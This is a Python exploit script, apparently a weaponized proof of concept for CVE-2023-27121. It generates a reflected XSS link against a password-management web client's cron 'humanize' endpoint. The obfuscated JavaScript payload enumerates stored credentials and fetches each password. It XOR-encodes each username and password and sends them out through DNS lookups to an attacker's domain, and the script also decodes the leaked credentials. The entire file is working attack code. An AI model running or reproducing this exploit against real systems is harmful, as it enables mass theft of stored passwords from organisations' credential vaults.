#!/usr/bin/env python3
import argparse

to_unicode_code_points = lambda string: ','.join(str(ord(char)) for char in string)

def generate_xss_payload(hostname, domain, key):
    print("[!] Generating XSS payload with the provided arguments...")
    credleak_payload = f"var H='HTTPS://',U=H+'{hostname}:10001/WEBCLIENT/',M='MAIN/',C='CREDENTIAL',E=new TextEncoder,Y=()=>E.encode('{key}'),Q=B=>new Uint8Array(E.encode(unescape(encodeURIComponent(B)))),T=B=>Array.from(Q(B).map(((C,I)=>C^Y()[I%Y().length])),(V=>`0${{(255&V).toString(16)}}`.slice(-2))).join('');fetch(U+M+'GETTREE').then((R=>R.json().then((F=>F.forEach((F=>fetch(U+C+'LISTGRID/SELECT?'+C+'GROUPID='+F.id,{{method:'POST'}}).then((R=>R.json())).then((D=>{{D.Data.forEach(L=K=>fetch(U+M+'COPYPASSWORDPOPUP?'+C+'ID='+K.Id).then((R=>R.json())).then((D=>{{fetch(H+T(K.Username)+'.'+T(D.response)+'.{domain}')}})))}}))))))));"
    return f"https://{hostname}:10001/framework/cron/action/humanize?cronString=0+0+1+/%3Csvg%0Conload=eval(String.fromCharCode({to_unicode_code_points(credleak_payload)}))%3E+*+?+*"

def xor_decode(xor_string, key):
    key_bytes = bytes(key, 'utf-8')
    decoded_bytes = bytearray()
    for i in range(len(xor_string)):
        decoded_byte = xor_string[i] ^ key_bytes[i % len(key_bytes)]
        decoded_bytes.append(decoded_byte)
    return decoded_bytes.decode('utf-8')

hex_decode = lambda hex_string: bytes.fromhex(hex_string)

def decode(encstring, key):
    xor_string = hex_decode(encstring)
    return xor_decode(xor_string, key)

def main(args):
    key = args.key.upper()

    if (args.encstring):
        enccreds = args.encstring.split(".")
        plaintext = decode(enccreds[0], key)
        if len(enccreds) == 2:
            plaintext += ":" + decode(enccreds[1], key)
        print("[!] Recovered credential: " + plaintext)

    elif (args.target and args.domain):
        payload = generate_xss_payload(args.target.upper(), args.domain.upper(), key)
        if (len(payload) > 2103):
            print("""[X] XSS payload contains too many characters, options to try:
    - Use as short a domain as you possibly can
    - Shorten the length of the key
    - Refactor the payload to make it smaller""")
            return
        print(f"[!] XSS payload:\n\n{payload}\n")
        print(f"[!] Recover leaked creds with:\n\tpython3 CVE-2023-27121_credleaker.py -k {key} -e <encoded response>\n")
    else:
        print("[X] Invalid arguments")

if __name__ == '__main__':
    parser = argparse.ArgumentParser(description="CVE-2023-27121 weaponized for credential leak by @au5_mate")
    parser.add_argument('-k', '--key', type=str, required=True, help="XOR key, will be converted to upper case")
    parser.add_argument('-t', '--target', type=str, help="Target host")
    parser.add_argument('-d', '--domain', type=str, help="DNS listener")
    parser.add_argument('-e', '--encstring', type=str, help="Encoded string")
    args = parser.parse_args()
    main(args)